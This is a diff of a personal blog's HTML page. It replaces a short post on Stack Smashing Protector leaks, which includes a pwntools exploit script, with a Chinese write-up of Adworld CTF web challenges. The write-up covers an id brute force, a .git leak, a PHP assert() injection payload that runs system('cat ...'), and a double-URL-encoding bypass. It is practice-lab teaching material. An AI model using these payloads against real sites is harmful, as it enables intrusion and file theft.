@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="Stack Smashing Protector(SSP)  leak">
+<meta name="description" content="攻防世界Web高手区解析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Stack Smashing Protector--SSP">
-<meta property="og:url" content="http://yoursite.com/2018/12/05/smashes-ssp/index.html">
+<meta property="og:title" content="WEB-要点2">
+<meta property="og:url" content="http://yoursite.com/2019/08/09/WEB-要点2/index.html">
 <meta property="og:site_name" content="Archer">
-<meta property="og:description" content="Stack Smashing Protector(SSP)  leak">
+<meta property="og:description" content="攻防世界Web高手区解析">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-15T02:58:30.954Z">
+<meta property="og:updated_time" content="2019-08-13T09:28:09.766Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Stack Smashing Protector--SSP">
-<meta name="twitter:description" content="Stack Smashing Protector(SSP)  leak">
+<meta name="twitter:title" content="WEB-要点2">
+<meta name="twitter:description" content="攻防世界Web高手区解析">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/05/smashes-ssp/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/08/09/WEB-要点2/"/>
 
 
 
 
 
-  <title>Stack Smashing Protector--SSP | Archer</title>
+  <title>WEB-要点2 | Archer</title>
   
 
 
@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/05/smashes-ssp/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/09/WEB-要点2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Fake Student">
@@ -249,7 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Stack Smashing Protector--SSP</h1>
+          <h1 class="post-title" itemprop="name headline">WEB-要点2</h1>
         
 
         <div class="post-meta">
@@ -261,8 +261,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-05T15:52:13+08:00">
-                2018-12-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T10:29:41+08:00">
+                2019-08-09
               </time>
             
 
@@ -299,8 +299,30 @@
       
 
       
-        <p>Stack Smashing Protector(SSP)  leak<br><a id="more"></a><br>觉得自己不能再补充了<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">大佬博客</a></p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./smashes"</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x400d21</span>)*<span class="number">150</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <p>攻防世界Web高手区解析<br><a id="more"></a></p>
+<h1 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h1><ul>
+<li>最开始点进来发现什么都没有，只有在报表中心可以点开新页面，分析URL看到id有个参数，可以利用burpsuit来爆破id，当id=2333时回显不同，修改URLid得到flag<h1 id="WEB2–mfw"><a href="#WEB2–mfw" class="headerlink" title="WEB2–mfw"></a>WEB2–mfw</h1></li>
+<li>首先打开目标网站发现什么都没有，就想着先用<strong>dirsearch</strong>来搜索一下发现有git目录，并且看到flag.php文件，通过URL访问发现什么都没有</li>
+<li>然后利用<strong>GitHack</strong>下载一下该网站的文件，看到index.php中有这样的代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
+<li>首先通过page参数来改变Url，然后用assert函数去执行语句。但是在执行之前会先判断page参数里是否有 <strong>..</strong> 有的话则报错没有便执行。</li>
+<li>assert与eval函数常常有一句话木马漏洞。<h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2></li>
+<li>page=about.php’, ‘123’) === false and system(‘cat templates/flag.php’) and strpos(‘templates/flag<h1 id="WEB6–PHP2"><a href="#WEB6–PHP2" class="headerlink" title="WEB6–PHP2"></a>WEB6–PHP2</h1><h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2></li>
+<li>首先用脚本dirsearch跑一下</li>
+<li><p>然后尝试URL\index.php发现还是没反应，试着用URL\index.phps显示php中代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过分析该代码发现，首先通过GET方式传递id参数</p>
+</li>
+<li>id不绝对等于admin，经过一次url解码函数后id=admin</li>
+<li>但是如果再加上从url中拿下来赋值也解码了一次，那么一共url解码了两次<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2></li>
+<li>将admin字串URL编码两次即可。</li>
+<li>url(admin)=%61%64%6d%69%6e</li>
+<li>url(%61%64%6d%69%6e)=%2561%2564%256d%2569%256e</li>
+<li>payload=URL?admin=%2561%2564%256d%2569%256e</li>
+</ul>
 
       
     </div>
@@ -325,8 +347,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/03/Docker Ues/" rel="next" title="局域网访问 Docker 容器">
-                <i class="fa fa-chevron-left"></i> 局域网访问 Docker 容器
+              <a href="/2019/08/08/WEB-要点/" rel="next" title="WEB 要点">
+                <i class="fa fa-chevron-left"></i> WEB 要点
               </a>
             
           </div>
@@ -334,10 +356,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/13/Canary-TSL/" rel="prev" title="Canary-TLS">
-                Canary-TLS <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -460,7 +478,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.</span> <span class="nav-text">EXP</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB1"><span class="nav-number">1.</span> <span class="nav-text">WEB1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB2–mfw"><span class="nav-number">2.</span> <span class="nav-text">WEB2–mfw</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payloads"><span class="nav-number">2.2.</span> <span class="nav-text">payloads</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB6–PHP2"><span class="nav-number">3.</span> <span class="nav-text">WEB6–PHP2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#做题思路"><span class="nav-number">3.1.</span> <span class="nav-text">做题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题解"><span class="nav-number">3.2.</span> <span class="nav-text">题解</span></a></li></ol></li></ol></div>
             
 
           </div>
